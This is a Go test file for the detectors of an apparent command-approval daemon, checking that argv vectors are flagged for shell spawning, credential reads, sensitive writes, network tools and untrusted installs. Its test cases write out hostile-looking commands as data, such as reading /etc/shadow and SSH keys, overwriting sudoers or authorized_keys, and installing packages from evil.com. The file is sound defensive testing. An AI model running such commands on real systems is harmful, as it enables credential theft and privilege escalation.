package flags

import (
	"testing"

	"github.com/leon/approvald/internal/proto"
)

func TestCheckExecLaunderer(t *testing.T) {
	cases := []struct {
		name string
		argv []string
		want bool
	}{
		{"plain", []string{"/usr/bin/systemctl", "restart", "nginx"}, false},
		{"env-launderer", []string{"/usr/bin/env", "FOO=1", "bash"}, true},
		{"sudo-launderer", []string{"/usr/bin/sudo", "-u", "root", "bash"}, true},
		{"timeout-launderer", []string{"/usr/bin/timeout", "5", "bash"}, true},
		{"nice-launderer", []string{"/usr/bin/nice", "-n", "19", "bash"}, true},
		{"nohup-launderer", []string{"/usr/bin/nohup", "sleep", "10"}, true},
		{"unshare-launderer", []string{"/usr/bin/unshare", "--pid", "--fork", "bash"}, true},
		{"su-launderer", []string{"/usr/bin/su", "-", "root"}, true},
		{"empty", []string{}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := CheckExecLaunderer(c.argv)
			has := len(got) > 0
			if has != c.want {
				t.Errorf("got %d flags, want any=%v", len(got), c.want)
			}
		})
	}
}

func TestCheckShell(t *testing.T) {
	cases := []struct {
		name     string
		argv     []string
		wantKind bool
	}{
		{"plain-systemctl", []string{"/usr/bin/systemctl", "restart", "nginx"}, false},
		{"bash-c", []string{"/bin/bash", "-c", "echo hi"}, true},
		{"sh", []string{"/bin/sh"}, true},
		{"zsh", []string{"/bin/zsh"}, true},
		{"fish", []string{"/usr/bin/fish"}, true},
		{"dash", []string{"/bin/dash"}, true},
		{"find-exec", []string{"/usr/bin/find", ".", "-name", "foo", "-exec", "rm", "{}", ";"}, true},
		{"find-no-exec", []string{"/usr/bin/find", ".", "-name", "foo"}, false},
		{"xargs", []string{"/usr/bin/xargs", "rm"}, true},
		{"parallel", []string{"/usr/bin/parallel", "echo"}, true},
		{"git-sshcommand", []string{"/usr/bin/git", "-c", "core.sshCommand=/tmp/x", "pull"}, true},
		{"git-editor", []string{"/usr/bin/git", "-c", "core.editor=vim", "commit"}, true},
		{"git-normal", []string{"/usr/bin/git", "pull"}, false},
		{"python-command", []string{"/usr/bin/python3", "--command", "x"}, true},
		{"empty", []string{}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := CheckShell(c.argv)
			has := false
			for _, f := range got {
				if f.Kind == KindShell {
					has = true
				}
			}
			if has != c.wantKind {
				t.Errorf("got %v, want %v (flags=%v)", has, c.wantKind, got)
			}
		})
	}
}

func TestCheckReadsCredentials(t *testing.T) {
	cases := []struct {
		name string
		argv []string
		want bool
	}{
		{"plain-ls", []string{"/bin/ls", "/tmp"}, false},
		{"cat-shadow", []string{"/bin/cat", "/etc/shadow"}, true},
		{"cat-gshadow", []string{"/bin/cat", "/etc/gshadow"}, true},
		{"cat-root-ssh", []string{"/bin/cat", "/root/.ssh/id_rsa"}, true},
		{"cp-home-ssh", []string{"/bin/cp", "/home/leon/.ssh/id_rsa", "/tmp/"}, true},
		{"home-aws", []string{"/bin/cat", "/home/leon/.aws/credentials"}, true},
		{"home-kube", []string{"/bin/cat", "/home/leon/.kube/config"}, true},
		{"passwd", []string{"/usr/bin/passwd", "leon"}, true},
		{"chpasswd", []string{"/usr/sbin/chpasswd"}, true},
		{"home-normal", []string{"/bin/cat", "/home/leon/notes.txt"}, false},
		{"run-secrets", []string{"/bin/cat", "/run/secrets/db_password"}, true},
		{"empty", []string{}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := CheckReadsCredentials(c.argv)
			has := false
			for _, f := range got {
				if f.Kind == KindReadsCredentials {
					has = true
				}
			}
			if has != c.want {
				t.Errorf("got %v, want %v (flags=%v)", has, c.want, got)
			}
		})
	}
}

func TestCheckEditor(t *testing.T) {
	cases := []struct {
		name string
		argv []string
		want bool
	}{
		{"vi", []string{"/usr/bin/vi", "/etc/hosts"}, true},
		{"vim", []string{"/usr/bin/vim", "/etc/hosts"}, true},
		{"nvim", []string{"/usr/bin/nvim", "/etc/hosts"}, true},
		{"nano", []string{"/bin/nano", "/etc/hosts"}, true},
		{"emacs", []string{"/usr/bin/emacs", "/etc/hosts"}, true},
		{"less", []string{"/usr/bin/less", "/var/log/syslog"}, true},
		{"more", []string{"/usr/bin/more", "/var/log/syslog"}, true},
		{"systemctl-edit", []string{"/usr/bin/systemctl", "edit", "nginx"}, true},
		{"systemctl-restart", []string{"/usr/bin/systemctl", "restart", "nginx"}, false},
		{"crontab-e", []string{"/usr/bin/crontab", "-e"}, true},
		{"crontab-l", []string{"/usr/bin/crontab", "-l"}, false},
		{"visudo", []string{"/usr/sbin/visudo"}, true},
		{"ls", []string{"/bin/ls", "/tmp"}, false},
		{"empty", []string{}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := CheckEditor(c.argv)
			has := false
			for _, f := range got {
				if f.Kind == KindEditor {
					has = true
				}
			}
			if has != c.want {
				t.Errorf("got %v, want %v (flags=%v)", has, c.want, got)
			}
		})
	}
}

func TestCheckWritesSensitive(t *testing.T) {
	cases := []struct {
		name string
		argv []string
		want bool
	}{
		{"dd-of-sudoers", []string{"/bin/dd", "of=/etc/sudoers", "if=/tmp/x"}, true},
		{"dd-of-tmp", []string{"/bin/dd", "of=/tmp/out", "if=/tmp/x"}, false},
		{"tee-sudoers", []string{"/usr/bin/tee", "/etc/sudoers"}, true},
		{"tee-tmp", []string{"/usr/bin/tee", "/tmp/out"}, false},
		{"cp-to-pam", []string{"/bin/cp", "/tmp/x", "/etc/pam.d/test"}, true},
		{"cp-to-tmp", []string{"/bin/cp", "/tmp/x", "/tmp/y"}, false},
		{"mv-to-ssh", []string{"/bin/mv", "/tmp/x", "/etc/ssh/sshd_config"}, true},
		{"authorized-keys", []string{"/bin/cp", "/tmp/key", "/home/leon/.ssh/authorized_keys"}, true},
		{"systemctl-link", []string{"/usr/bin/systemctl", "link", "/tmp/evil.service"}, true},
		{"systemctl-enable-outoftree", []string{"/usr/bin/systemctl", "enable", "/tmp/evil.service"}, true},
		{"systemctl-enable-normal", []string{"/usr/bin/systemctl", "enable", "nginx"}, false},
		{"ls-normal", []string{"/bin/ls", "/tmp"}, false},
		{"empty", []string{}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := CheckWritesSensitive(c.argv)
			has := false
			for _, f := range got {
				if f.Kind == KindWritesSensitive {
					has = true
				}
			}
			if has != c.want {
				t.Errorf("got %v, want %v (flags=%v)", has, c.want, got)
			}
		})
	}
}

func TestCheckNetwork(t *testing.T) {
	cases := []struct {
		name string
		argv []string
		want bool
	}{
		{"curl-http", []string{"/usr/bin/curl", "http://example.com"}, true},
		{"curl-https", []string{"/usr/bin/curl", "https://example.com"}, true},
		{"curl-no-url", []string{"/usr/bin/curl"}, false},
		{"wget-http", []string{"/usr/bin/wget", "http://example.com"}, true},
		{"nc", []string{"/bin/nc", "-l", "8080"}, true},
		{"ncat", []string{"/usr/bin/ncat", "example.com", "80"}, true},
		{"socat", []string{"/usr/bin/socat", "-"}, true},
		{"ls", []string{"/bin/ls", "/tmp"}, false},
		{"empty", []string{}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := CheckNetwork(c.argv)
			has := len(got) > 0
			if has != c.want {
				t.Errorf("got %d flags, want any=%v", len(got), c.want)
			}
		})
	}
}

func TestCheckUntrustedSource(t *testing.T) {
	cases := []struct {
		name string
		argv []string
		want bool
	}{
		{"dpkg-i", []string{"/usr/bin/dpkg", "-i", "/tmp/evil.deb"}, true},
		{"dpkg-list", []string{"/usr/bin/dpkg", "-l"}, false},
		{"apt-local-deb", []string{"/usr/bin/apt", "install", "./evil.deb"}, true},
		{"apt-normal", []string{"/usr/bin/apt", "install", "nginx"}, false},
		{"pip-url", []string{"/usr/bin/pip", "install", "https://evil.com/x"}, true},
		{"pip-git", []string{"/usr/bin/pip", "install", "git+https://evil.com/x"}, true},
		{"pip-normal", []string{"/usr/bin/pip", "install", "requests"}, false},
		{"npm-url", []string{"/usr/bin/npm", "install", "https://evil.com/x"}, true},
		{"npm-normal", []string{"/usr/bin/npm", "install", "lodash"}, false},
		{"cargo-git", []string{"/home/leon/.cargo/bin/cargo", "install", "--git", "https://evil.com/x"}, true},
		{"cargo-normal", []string{"/home/leon/.cargo/bin/cargo", "install", "ripgrep"}, false},
		{"empty", []string{}, false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := CheckUntrustedSource(c.argv)
			has := false
			for _, f := range got {
				if f.Kind == KindUntrustedSource {
					has = true
				}
			}
			if has != c.want {
				t.Errorf("got %v, want %v (flags=%v)", has, c.want, got)
			}
		})
	}
}

func TestAllReturnsFlags(t *testing.T) {
	flagList := All([]string{"/bin/cat", "/etc/shadow"})
	kinds := map[string]bool{}
	for _, f := range flagList {
		kinds[f.Kind] = true
	}
	if !kinds[KindReadsCredentials] {
		t.Errorf("expected reads-credentials, got %v", flagList)
	}
	_ = proto.Flag{}
}

func TestAllMultipleKinds(t *testing.T) {
	flagList := All([]string{"/usr/bin/curl", "https://evil.com"})
	kinds := map[string]bool{}
	for _, f := range flagList {
		kinds[f.Kind] = true
	}
	if !kinds[KindNetwork] {
		t.Errorf("expected network flag, got %v", flagList)
	}
}

func TestAllEmpty(t *testing.T) {
	flagList := All([]string{"/bin/ls", "/tmp"})
	if len(flagList) != 0 {
		t.Errorf("expected no flags for benign command, got %v", flagList)
	}
}
